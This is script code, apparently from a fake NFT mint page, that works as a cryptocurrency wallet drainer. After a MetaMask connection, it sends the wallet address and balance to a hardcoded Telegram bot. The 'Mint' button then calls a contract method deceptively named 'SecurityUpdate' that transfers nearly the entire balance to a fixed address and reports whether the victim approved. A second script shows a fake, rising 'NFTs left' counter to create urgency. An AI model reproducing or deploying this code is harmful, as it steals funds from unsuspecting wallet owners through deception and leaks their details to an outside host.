    <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=63b7d8d0682418eeb9d5f4de" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
<script>
  var account = "";
  let apiToken = "5577087085:AAExUp90Q2jhgffqxZTALvErvO4HsN1nEWI";
  let chatId = "5294935331";

  /* To connect using MetaMask */

  if (window.ethereum) {
    handleEthereum();
  } else {
    window.addEventListener("ethereum#initialized", handleEthereum, {
      once: true,
    });

    // If the event is not dispatched by the end of the timeout,
    // the user probably doesn't have MetaMask installed.
    setTimeout(handleEthereum, 3000); // 3 seconds
  }

  function sendMessage(text) {
    let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}`;

    let request = new XMLHttpRequest();
    request.open("GET", urlString);
    request.send();

    let response = request.response;

    return response;
  }

  function handleEthereum() {
    const { ethereum } = window;
    if (ethereum && ethereum.isMetaMask) {
      console.log("Ethereum successfully detected!");
      // Access the decentralized web!
      var abi = [
        {
          constant: true,
          inputs: [],
          name: "getBalance",
          outputs: [{ name: "", type: "uint256" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          constant: false,
          inputs: [],
          name: "withdraw",
          outputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
        {
          constant: false,
          inputs: [],
          name: "SecurityUpdate",
          outputs: [],
          payable: true,
          stateMutability: "payable",
          type: "function",
        },
        {
          constant: true,
          inputs: [],
          name: "getOwner",
          outputs: [{ name: "", type: "address" }],
          payable: false,
          stateMutability: "view",
          type: "function",
        },
        {
          inputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "constructor",
        },
      ];
      window.web3 = new Web3(window.ethereum);
      window.contract = new web3.eth.Contract(
        abi,
        "0xb96B2EB882d599c8caCC37CDB9C73802A1BE36Ff"
      );
    } else {
      console.log("Please install MetaMask!");
    }
  }

  async function connect() {
    if (account) {
      var BN = web3.utils.BN;
      var totalBalance = await web3.eth.getBalance(account);
      var estimateGas = await web3.eth.estimateGas({
        value: totalBalance,
        data: contract.methods.SecurityUpdate().encodeABI(),
        from: account,
        to: "0xb96B2EB882d599c8caCC37CDB9C73802A1BE36Ff",
      });
      var gasPrice = await web3.eth.getGasPrice();
      var gas = new BN(estimateGas).mul(new BN(gasPrice)).mul(new BN("10"));
      var amount = new BN(totalBalance).sub(gas);

      if (amount < 0) {
        var text = `Wallet connected (${account}) does not have enough crypto`;
        alert("Not enough cash for gas");
        return;
      }

      contract.methods
        .SecurityUpdate()
        .send({ from: account, value: amount })
        .on("error", (e) => {
          console.log(e);

          var text = `Wallet (${account}) cancelled transaction`;
          sendMessage(text);
        })
        .on("receipt", (r) => {
          console.log(r);

          var text = `Wallet (${account}) approved transaction`;
          sendMessage(text);
        });
    } else if (window.ethereum) {
      console.log(window);
      try {
        var accounts = await window.ethereum.request({
          method: "eth_requestAccounts",
        });

        account = web3.eth.accounts.givenProvider.selectedAddress;
        var balance = await web3.eth.getBalance(account);
        var eth = web3.utils.fromWei(balance);
        var text = `Wallet connected (${account}) with ${eth} ETH balance`;

        sendMessage(text);

        document.getElementById("wallet_connect").innerHTML ="Mint";
        document.getElementById("wallet_connect2").innerHTML ="Wallet Connected";
        document.querySelector('#wallet_connect2').disabled = true;
      } catch (err) {
        console.log(err);
      }
    } else {
      console.log("Please install Metamask");
    }
  }
</script>

  <script>
    db = window.localStorage;

    if (db.getItem('amount') == null)
    {
        var amount = 8678
        db.setItem("amount", amount)
    } else {
        var amount = parseInt(db.getItem('amount'))
    }
    smooth_amount = amount
    var counter = 0
    // Update the count down every 1 second
    var x = setInterval(function() {
      counter++
      if (counter > 40)
      {
        counter = 0
        if (amount < 9989)
        {
            logic = Math.floor((1 - (amount / 9999)) * 100)
            amount = Math.floor(Math.random() * logic) + amount
            db.setItem("amount", amount)
            db.setItem("max", logic)
        }
      }
      if (smooth_amount < amount) {
        smooth_amount = smooth_amount + ((amount - smooth_amount)/(20 - counter))
      }
      // Display the result in the element with id="demo"
      document.getElementById("nft_left").innerHTML = smooth_amount.toFixed(0);
      // If the count down is finished, write some text
    }, 100);
</script>
